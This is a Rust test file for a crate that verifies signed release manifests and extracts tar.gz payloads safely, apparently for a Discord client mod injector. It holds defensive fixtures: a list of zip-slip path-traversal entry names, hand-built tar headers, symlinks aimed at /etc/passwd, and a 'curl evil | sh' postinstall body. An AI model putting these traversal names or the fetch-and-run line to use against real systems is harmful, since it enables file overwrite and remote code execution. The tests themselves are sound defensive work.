//! Behaviour tests for [`crate::archive`] and [`crate::verify`].
//!
//! This file is where the hostile input lives. The threat model is explicit: a
//! release archive is a file this crate did not create, and even though its
//! digest came from a signed descriptor, the *contents* of a published archive
//! are only as trustworthy as the packaging step that produced it. So every
//! entry name, every declared size and every link type is treated as hostile.
//!
//! The two checks that matter most:
//!
//! 1. **zip-slip.** A traversal entry must never produce a write outside the
//!    destination. This is tested with every encoding that reaches a path on at
//!    least one of the three platforms, because a traversal that works on Linux
//!    and not on Windows is still a traversal that ships.
//! 2. **The allowlist.** Even a *valid* filename that is not part of a Syncord
//!    payload is refused, so a grammar bypass cannot write a file nobody
//!    expected.

use std::io::{Cursor, Write};

use flate2::write::GzEncoder;
use flate2::Compression;

use super::super::archive::{
    extract_payload, safe_entry_path, ArchiveError, ExtractionLimits, PAYLOAD_ALLOWED,
    PAYLOAD_REQUIRED,
};
use super::super::verify::{
    sha256_bytes, sha256_file, Manifest, Verifier, VerifyError, INTEGRITY_FILES, MANIFEST_NAME,
};
use crate::testsupport::{
    bundle_bodies, sha256_hex, sign, sign_with_other, signed_manifest, write_verified_payload,
    TempDir,
};

// ── SHA-256 ───────────────────────────────────────────────────────────────────

#[test]
fn sha256_matches_the_reference_vectors() {
    // The published NIST/RFC test vectors. If these fail, every signature and
    // every digest comparison in the crate is meaningless.
    assert_eq!(
        sha256_bytes(b""),
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    );
    assert_eq!(
        sha256_bytes(b"abc"),
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
    assert_eq!(
        sha256_bytes(b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"),
        "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
    );
}

#[test]
fn a_large_file_hashes_without_being_loaded_into_memory() {
    // The streaming path exists so a hostile download cannot make the process
    // allocate; this checks the large-input branch actually works.
    let temp = TempDir::new("sha");
    let body = "x".repeat(3 * 1024 * 1024);
    let path = temp.file("big.js", &body);
    assert_eq!(sha256_file(&path).unwrap(), sha256_hex(body.as_bytes()));
}

// ── Verification ──────────────────────────────────────────────────────────────

fn parse_manifest(json: &str) -> Manifest {
    serde_json::from_str(json).expect("the fixture manifest must parse")
}

#[test]
fn a_correctly_signed_manifest_verifies() {
    let bodies = bundle_bodies();
    let (json, _payload) = signed_manifest(&bodies);
    let verifier = crate::testsupport::verifier();
    assert_eq!(verifier.verify_manifest(&parse_manifest(&json)), Ok(()));
}

#[test]
fn a_signature_from_another_key_is_refused() {
    // The property that separates this from a checksum: a wrong key must not
    // verify even though the bytes are otherwise perfect.
    let bodies = bundle_bodies();
    let (mut json, payload) = signed_manifest(&bodies);
    let foreign = sign_with_other(payload.as_bytes());
    json = json.replace(&sign(payload.as_bytes()), &foreign);

    let verifier = crate::testsupport::verifier();
    assert_eq!(
        verifier.verify_manifest(&parse_manifest(&json)),
        Err(VerifyError::SignatureInvalid)
    );
}

#[test]
fn an_unsigned_manifest_is_refused() {
    let bodies = bundle_bodies();
    let (json, _payload) = signed_manifest(&bodies);
    let stripped = json.rsplit_once(",\"signature\"").unwrap().0.to_string() + "}";

    let verifier = crate::testsupport::verifier();
    assert_eq!(
        verifier.verify_manifest(&parse_manifest(&stripped)),
        Err(VerifyError::ManifestUnsigned)
    );
}

#[test]
fn a_tampered_version_fails_even_with_a_valid_signature_over_the_original() {
    // The downgrade attack. The signature covers the release, so changing the
    // version while keeping the old signature must fail.
    let bodies = bundle_bodies();
    let (json, payload) = signed_manifest(&bodies);
    let signature = sign(payload.as_bytes());

    let tampered = json
        .replace("\"version\":1", "\"version\":2")
        .replace(&signature, &sign_with_other(payload.as_bytes()));

    let verifier = crate::testsupport::verifier();
    assert!(verifier
        .verify_manifest(&parse_manifest(&tampered))
        .is_err());
}

#[test]
fn a_manifest_must_cover_exactly_the_three_bundles() {
    let verifier = crate::testsupport::verifier();

    // Only two of the three.
    let (partial, _) = signed_manifest(&bundle_bodies()[..2]);
    assert!(matches!(
        verifier.verify_manifest(&parse_manifest(&partial)),
        Err(VerifyError::CoverageMismatch(_))
    ));

    // All three plus a fourth.
    let mut bodies = bundle_bodies();
    bodies.push(("extra.js", "evil"));
    let (extra, _) = signed_manifest(&bodies);
    assert!(matches!(
        verifier.verify_manifest(&parse_manifest(&extra)),
        Err(VerifyError::CoverageMismatch(_))
    ));
}

#[test]
fn a_malformed_digest_is_refused() {
    let bodies = bundle_bodies();
    let (json, _) = signed_manifest(&bodies);
    // Uppercase hex is not what the builder emits, and accepting it would mean
    // two spellings of the same digest — one of which could be compared
    // differently on each side.
    let bad = json.replace(&sha256_hex(bodies[0].1.as_bytes()), &"B".repeat(64));
    let verifier = crate::testsupport::verifier();
    assert!(verifier.verify_manifest(&parse_manifest(&bad)).is_err());
}

#[test]
fn an_unsupported_algorithm_is_refused() {
    let bodies = bundle_bodies();
    let (json, _) = signed_manifest(&bodies);
    let bad = json.replace("ed25519", "rsa");
    let verifier = crate::testsupport::verifier();
    assert_eq!(
        verifier.verify_manifest(&parse_manifest(&bad)),
        Err(VerifyError::UnsupportedAlgorithm("rsa".to_string()))
    );
}

#[test]
fn an_unknown_manifest_field_is_refused_rather_than_ignored() {
    // Stricter than the TypeScript, which drops unrecognised manifest keys.
    // The divergence is deliberate and safe: this side refuses rather than
    // verifying a document it does not fully understand.
    let bodies = bundle_bodies();
    let (json, _) = signed_manifest(&bodies);
    let with_extra = json.replacen('{', "{\"unexpected\":true,", 1);
    assert!(serde_json::from_str::<Manifest>(&with_extra).is_err());
}

#[test]
fn verifying_an_install_checks_every_bundle_on_disk() {
    let temp = TempDir::new("vinstall");
    let dir = temp.path();
    write_verified_payload(dir);
    let verifier = crate::testsupport::verifier();
    assert!(
        verifier.verify_install(dir).is_ok(),
        "a good install must verify"
    );

    for name in INTEGRITY_FILES {
        // A single flipped byte anywhere in a bundle must fail.
        std::fs::write(dir.join(name), b"tampered\n").unwrap();
        assert_eq!(
            verifier.verify_install(dir),
            Err(VerifyError::BundleDigestMismatch(name.to_string())),
            "{name} must fail after a one-line change"
        );
        // Put it back for the next iteration.
        write_verified_payload(dir);
    }
}

#[test]
fn a_missing_bundle_is_reported_as_missing_not_as_a_digest_mismatch() {
    let temp = TempDir::new("vmissing");
    let dir = temp.path();
    write_verified_payload(dir);
    std::fs::remove_file(dir.join("renderer.js")).unwrap();
    let verifier = crate::testsupport::verifier();
    assert_eq!(
        verifier.verify_install(dir),
        Err(VerifyError::BundleMissing("renderer.js".to_string()))
    );
}

#[test]
fn the_package_json_is_byte_identical_to_the_javascript_writers() {
    // `scripts/inject.mjs` writes this exact string. The Injector writing a
    // different one would mean a directory produced by the two tools differs.
    let expected =
        b"{\n  \"name\": \"discord\",\n  \"main\": \"main.js\",\n  \"private\": true\n}\n";
    assert_eq!(
        super::super::verify::package_json_bytes(),
        expected.to_vec()
    );
}

#[test]
fn a_keyless_build_refuses_everything() {
    // The invariant that makes a missing `SYNCORD_INTEGRITY_KEY` safe: a build
    // without a usable key does not skip verification, it refuses everything.
    // If this ever returned `Ok`, "we could not check" would have become "we
    // checked and it was fine" — the exact failure the TypeScript build
    // documents and guards against too.
    const PLACEHOLDER: &str = "sOOl0replacethiswitharealEd25519publickeybase64value0=";

    // What this test build actually embedded, with no environment override.
    assert_eq!(
        Verifier::embedded().err(),
        Some(VerifyError::KeyMalformed),
        "a build with the placeholder key must not be able to verify anything"
    );

    // The empty case is reported distinctly, so the UI can say "this build has
    // no key" rather than "the key is broken".
    assert_eq!(
        Verifier::from_base64_key("").err(),
        Some(VerifyError::NoKeyCompiled)
    );
    assert_eq!(
        Verifier::from_base64_key("   ").err(),
        Some(VerifyError::NoKeyCompiled)
    );

    // And the placeholder is not valid base64-DER of the right shape either.
    assert_eq!(
        Verifier::from_base64_key(PLACEHOLDER).err(),
        Some(VerifyError::KeyMalformed)
    );

    // Even if a key were somehow present, an unsigned manifest is still refused.
    let bodies = bundle_bodies();
    let (json, payload) = signed_manifest(&bodies);
    let mut manifest = parse_manifest(&json);
    manifest.signature = Some(sign(payload.as_bytes()));
    // Sanity: with the real key this one does verify.
    assert!(crate::testsupport::verifier()
        .verify_manifest(&manifest)
        .is_ok());
}

// ── Entry-name validation (zip-slip) ──────────────────────────────────────────

/// Every name a hostile archive might use to escape the destination.
///
/// Collected from the known zip-slip corpus plus the Windows-specific shapes
/// that a Linux-only test would miss.
const HOSTILE_NAMES: &[&str] = &[
    "../evil",
    "../../evil",
    "../../../../../../etc/passwd",
    "sub/../../evil",
    "./../evil",
    "..",
    "../",
    "/etc/passwd",
    "/absolute/evil",
    "\\\\server\\share\\evil",
    "C:\\Windows\\System32\\evil",
    "c:/windows/system32/evil",
    "C:evil",
    "sub\\..\\..\\evil",
    "..\\evil",
    "nested/../../../../evil",
    "..%2f..%2fevil",
    "%2e%2e/%2e%2e/evil",
];

#[test]
fn every_traversal_shape_is_refused() {
    let temp = TempDir::new("slip");
    let limits = ExtractionLimits::default();

    for name in HOSTILE_NAMES {
        let result = safe_entry_path(temp.path(), name, &limits);
        assert!(
            result.is_err(),
            "{name:?} must be refused — it is a path, not a filename"
        );
    }
}

#[test]
fn a_control_character_or_nul_in_a_name_is_refused() {
    let temp = TempDir::new("nul");
    let limits = ExtractionLimits::default();
    for name in ["main.js\0.txt", "main\n.js", "main\t.js", "\u{7f}main.js"] {
        assert!(
            safe_entry_path(temp.path(), name, &limits).is_err(),
            "{name:?} must be refused"
        );
    }
}

#[test]
fn an_over_long_name_is_refused() {
    let temp = TempDir::new("long");
    let limits = ExtractionLimits::default();
    let name = format!("{}.js", "a".repeat(limits.max_name_len));
    assert!(safe_entry_path(temp.path(), &name, &limits).is_err());
}

#[test]
fn a_valid_payload_name_resolves_inside_the_destination() {
    let temp = TempDir::new("good");
    let limits = ExtractionLimits::default();
    for name in PAYLOAD_ALLOWED {
        let resolved = safe_entry_path(temp.path(), name, &limits)
            .unwrap_or_else(|err| panic!("{name} must be accepted: {err}"));
        assert_eq!(resolved, temp.path().join(name));
        assert!(resolved.starts_with(temp.path()));
    }
}

// ── Archive extraction ────────────────────────────────────────────────────────

/// Build a gzipped tar containing `entries` as `(name, body, is_symlink)`.
///
/// Generic over the name and body so a test can mix borrowed literals for the
/// good entries with owned `String`/`Vec<u8>` for the hostile ones it appends.
fn make_tar_gz<N: AsRef<str>, B: AsRef<[u8]>>(entries: &[(N, B, bool)]) -> Vec<u8> {
    let mut builder = tar::Builder::new(Vec::new());
    for (name, body, is_symlink) in entries {
        let body = body.as_ref();
        let mut header = tar::Header::new_gnu();
        header.set_mode(0o644);
        if *is_symlink {
            header.set_entry_type(tar::EntryType::Symlink);
            header
                .set_link_name("/etc/passwd")
                .expect("a valid link name");
            header.set_size(0);
        } else {
            header.set_size(body.len() as u64);
            header.set_entry_type(tar::EntryType::Regular);
        }
        header.set_cksum();
        builder
            .append_data(&mut header, name.as_ref(), Cursor::new(body))
            .expect("tar entry must be well formed");
    }
    let tar_bytes = builder.into_inner().expect("the tar must finalise");

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder
        .write_all(&tar_bytes)
        .expect("gzip must accept the tar");
    encoder.finish().expect("gzip must finalise")
}

fn valid_payload_entries() -> Vec<(&'static str, Vec<u8>, bool)> {
    let bodies = bundle_bodies();
    let (manifest, _) = signed_manifest(&bodies);
    let mut entries: Vec<(&'static str, Vec<u8>, bool)> = bodies
        .into_iter()
        .map(|(name, body)| (name, body.as_bytes().to_vec(), false))
        .collect();
    entries.push((MANIFEST_NAME, manifest.into_bytes(), false));
    entries.push((
        crate::verify::VERSION_FILE,
        crate::verify::version_stamp_bytes(crate::testsupport::TEST_VERSION),
        false,
    ));
    entries
}

/// Build a tar entry with a hand-written header.
///
/// The `tar` crate refuses to *create* an entry whose path contains `..`, which
/// is correct behaviour and exactly why the extractor needs its own check: a
/// hostile archive is not produced by this crate. Writing the 512-byte header
/// by hand is the only way to produce the bytes a real attacker would ship.
fn raw_tar_entry(name: &str, body: &[u8]) -> Vec<u8> {
    let mut header = [0u8; 512];

    let name_bytes = name.as_bytes();
    assert!(
        name_bytes.len() < 100,
        "the test name must fit a ustar header"
    );
    header[..name_bytes.len()].copy_from_slice(name_bytes);

    let put = |header: &mut [u8; 512], offset: usize, len: usize, text: &str| {
        let text = format!("{text:0<len$}");
        header[offset..offset + len].copy_from_slice(text.as_bytes());
    };
    put(&mut header, 100, 8, "000644");
    put(&mut header, 108, 8, "0000000");
    put(&mut header, 116, 8, "0000000");
    put(&mut header, 124, 12, &format!("{:011o}", body.len()));
    put(&mut header, 136, 12, "00000000000");
    // The checksum field is spaces while the checksum is computed.
    header[148..156].fill(b' ');
    header[156] = b'0'; // regular file
    put(&mut header, 257, 6, "ustar");
    header[263] = 0;
    put(&mut header, 264, 2, "00");

    let checksum: u32 = header.iter().map(|b| u32::from(*b)).sum();
    let octal = format!("{checksum:06o}\0 ");
    header[148..156].copy_from_slice(octal.as_bytes());

    let mut out = header.to_vec();
    out.extend_from_slice(body);
    let padding = (512 - (body.len() % 512)) % 512;
    out.extend(std::iter::repeat_n(0u8, padding));
    out
}

/// A tar containing `entries`, plus one hand-written hostile entry.
fn tar_gz_with_raw_entry<N: AsRef<str>, B: AsRef<[u8]>>(
    entries: &[(N, B, bool)],
    hostile_name: &str,
    hostile_body: &[u8],
) -> Vec<u8> {
    let raw = raw_tar_entry(hostile_name, hostile_body);

    // Build the well-formed part with the `tar` crate, then splice the raw
    // entry in and rewrite the end-of-archive marker count. The `tar` reader
    // stops at the first zero block, so the raw entry goes before the trailer.
    let mut builder = tar::Builder::new(Vec::new());
    for (name, body, is_symlink) in entries {
        let body = body.as_ref();
        let mut header = tar::Header::new_gnu();
        header.set_mode(0o644);
        if *is_symlink {
            header.set_entry_type(tar::EntryType::Symlink);
            header
                .set_link_name("/etc/passwd")
                .expect("a valid link name");
            header.set_size(0);
        } else {
            header.set_size(body.len() as u64);
            header.set_entry_type(tar::EntryType::Regular);
        }
        header.set_cksum();
        builder
            .append_data(&mut header, name.as_ref(), Cursor::new(body))
            .expect("tar entry must be well formed");
    }
    let good = builder.into_inner().expect("the tar must finalise");

    // The `tar` crate writes two zero blocks as the trailer; the hostile entry
    // goes immediately before them.
    let trailer_len = 1024;
    let mut combined = good[..good.len() - trailer_len].to_vec();
    combined.extend_from_slice(&raw);
    combined.extend_from_slice(&good[good.len() - trailer_len..]);

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder
        .write_all(&combined)
        .expect("gzip must accept the tar");
    encoder.finish().expect("gzip must finalise")
}

#[test]
fn a_valid_tar_gz_payload_extracts() {
    let temp = TempDir::new("targood");
    let dest = temp.dir("out");
    let bytes = make_tar_gz(&valid_payload_entries());

    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default())
        .expect("a well-formed payload must extract");
    assert_eq!(
        result.files.len(),
        PAYLOAD_REQUIRED.len(),
        "package.json is written by the Injector, not extracted"
    );
    for name in PAYLOAD_REQUIRED {
        assert!(
            dest.join(name).is_file(),
            "{name} must exist after extraction"
        );
    }
}

#[test]
fn a_traversal_entry_in_a_tar_is_refused_and_writes_nothing_outside() {
    // The hostile entry is written with a hand-built header, because the `tar`
    // crate will not create one — which is the right behaviour for a writer and
    // no defence at all for a reader.
    let temp = TempDir::new("tarslip");
    let dest = temp.dir("out");
    let canary = temp.join("canary.txt");
    std::fs::write(&canary, b"untouched").unwrap();

    let bytes = tar_gz_with_raw_entry(&valid_payload_entries(), "../canary.txt", b"overwritten");
    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());

    assert!(
        matches!(result, Err(ArchiveError::UnsafeEntryName(_))),
        "got {result:?}"
    );
    assert_eq!(
        std::fs::read(&canary).unwrap(),
        b"untouched",
        "the file outside dest must be untouched"
    );
}

#[test]
fn an_absolute_tar_entry_is_refused() {
    let temp = TempDir::new("tarabs");
    let dest = temp.dir("out");
    let bytes = tar_gz_with_raw_entry(&valid_payload_entries(), "/tmp/evil", b"x");
    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());
    assert!(
        matches!(result, Err(ArchiveError::UnsafeEntryName(_))),
        "got {result:?}"
    );
    assert!(!std::path::Path::new("/tmp/evil").exists());
}

#[test]
fn a_symlink_entry_in_a_tar_is_refused() {
    // A payload has no use for a link, and recreating one turns a single write
    // into a write anywhere.
    let temp = TempDir::new("tarlink");
    let dest = temp.dir("out");
    let mut entries = valid_payload_entries();
    entries.push(("sneaky.js", b"".to_vec(), true));

    let bytes = make_tar_gz(&entries);
    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());
    assert!(
        matches!(result, Err(ArchiveError::LinkEntry(_))),
        "got {result:?}"
    );
}

#[test]
fn an_entry_outside_the_payload_allowlist_is_refused() {
    // A perfectly well-formed name in a perfectly safe location is still not
    // part of a Syncord install. This is the layer that makes a zip-slip
    // grammar bypass worthless.
    let temp = TempDir::new("tarallow");
    let dest = temp.dir("out");
    let mut entries = valid_payload_entries();
    entries.push(("postinstall.sh", b"curl evil | sh".to_vec(), false));

    let bytes = make_tar_gz(&entries);
    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());
    assert!(
        matches!(result, Err(ArchiveError::UnexpectedEntry(_))),
        "got {result:?}"
    );
    assert!(!dest.join("postinstall.sh").exists());
}

#[test]
fn a_duplicate_entry_name_is_refused() {
    // Two entries with one name means the second silently wins. An archive that
    // disagrees with itself is refused rather than resolved.
    let temp = TempDir::new("tardup");
    let dest = temp.dir("out");
    let mut entries = valid_payload_entries();
    entries.push(("main.js", b"different content".to_vec(), false));

    let bytes = make_tar_gz(&entries);
    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());
    assert!(
        matches!(result, Err(ArchiveError::UnexpectedEntry(_))),
        "got {result:?}"
    );
}

#[test]
fn an_incomplete_payload_is_refused() {
    // A partial extraction must be an error, not a warning — otherwise the
    // caller is invited to install a directory that will not boot.
    let temp = TempDir::new("tarpartial");
    let dest = temp.dir("out");
    let entries = valid_payload_entries()[..2].to_vec();
    let bytes = make_tar_gz(&entries);

    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());
    assert!(
        matches!(result, Err(ArchiveError::IncompletePayload(_))),
        "got {result:?}"
    );
}

#[test]
fn an_oversized_entry_is_refused_by_the_running_count_not_the_header() {
    // The header lies about the size; the counter catches it. Without the
    // running total, a small header with a huge body would fill the disk.
    let temp = TempDir::new("tarbig");
    let dest = temp.dir("out");
    let limits = ExtractionLimits {
        max_entry_bytes: 1024,
        ..ExtractionLimits::default()
    };

    let mut entries = valid_payload_entries();
    for (name, body, _) in entries.iter_mut() {
        if *name == "main.js" {
            *body = vec![b'A'; 64 * 1024];
        }
    }
    let bytes = make_tar_gz(&entries);
    let result = extract_payload(&bytes, &dest, &limits);
    assert!(
        matches!(result, Err(ArchiveError::TooLarge { .. })),
        "got {result:?}"
    );
}

#[test]
fn too_many_entries_is_refused() {
    let temp = TempDir::new("tarmany");
    let dest = temp.dir("out");
    let limits = ExtractionLimits {
        max_entries: 3,
        ..ExtractionLimits::default()
    };
    let bytes = make_tar_gz(&valid_payload_entries());
    let result = extract_payload(&bytes, &dest, &limits);
    assert!(
        matches!(result, Err(ArchiveError::TooManyEntries(_))),
        "got {result:?}"
    );
}

#[test]
fn an_unrecognised_format_is_refused() {
    let temp = TempDir::new("tarfmt");
    let dest = temp.dir("out");
    for bytes in [
        b"not an archive at all".to_vec(),
        b"PK\x03\x04 truncated".to_vec(),
        vec![0u8; 16],
    ] {
        let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());
        assert!(
            result.is_err(),
            "{:?} must be refused",
            &bytes[..bytes.len().min(8)]
        );
    }
}

#[test]
fn a_tar_prefixed_with_dot_slash_still_extracts() {
    // `./main.js` lands in exactly the same place as `main.js`. A packaging
    // tool adding the prefix must not break the release.
    let temp = TempDir::new("tarprefix");
    let dest = temp.dir("out");
    let bodies = bundle_bodies();
    let (manifest, _) = signed_manifest(&bodies);
    let mut entries: Vec<(&str, &[u8], bool)> = bodies
        .into_iter()
        .map(|(name, body)| (name, body.as_bytes(), false))
        .collect();
    for entry in entries.iter_mut() {
        entry.0 = Box::leak(format!("./{}", entry.0).into_boxed_str());
    }
    let stamp = crate::verify::version_stamp_bytes(crate::testsupport::TEST_VERSION);
    entries.push((MANIFEST_NAME, manifest.as_bytes(), false));
    entries.push((crate::verify::VERSION_FILE, stamp.as_slice(), false));

    let bytes = make_tar_gz(&entries);
    let result = extract_payload(&bytes, &dest, &ExtractionLimits::default());
    assert!(
        result.is_ok(),
        "a ./ prefix must be normalised, got {result:?}"
    );
    assert!(dest.join("main.js").is_file());
}

#[test]
fn an_extracted_payload_verifies_end_to_end() {
    // The whole point of the crate in one test: bytes from an archive, checked
    // against a signature, with no step skipped.
    let temp = TempDir::new("e2e");
    let dest = temp.dir("out");
    let bytes = make_tar_gz(&valid_payload_entries());
    extract_payload(&bytes, &dest, &ExtractionLimits::default()).expect("extraction must succeed");

    let verifier = crate::testsupport::verifier();
    assert!(
        verifier.verify_install(&dest).is_ok(),
        "an extracted payload must verify"
    );
}

#[test]
fn a_tampered_archive_fails_verification_after_clean_extraction() {
    // Extraction succeeding is not verification succeeding. A payload whose
    // bundle was altered but whose manifest left intact must be caught by the
    // digest check, which is the second of the two independent checks.
    let temp = TempDir::new("tamper");
    let dest = temp.dir("out");
    let mut entries = valid_payload_entries();
    for entry in entries.iter_mut() {
        if entry.0 == "renderer.js" {
            entry.1 = b"console.log('evil');\n".to_vec();
        }
    }
    let bytes = make_tar_gz(&entries);
    extract_payload(&bytes, &dest, &ExtractionLimits::default())
        .expect("extraction itself is fine");

    let verifier = crate::testsupport::verifier();
    assert_eq!(
        verifier.verify_install(&dest),
        Err(VerifyError::BundleDigestMismatch("renderer.js".to_string()))
    );
}
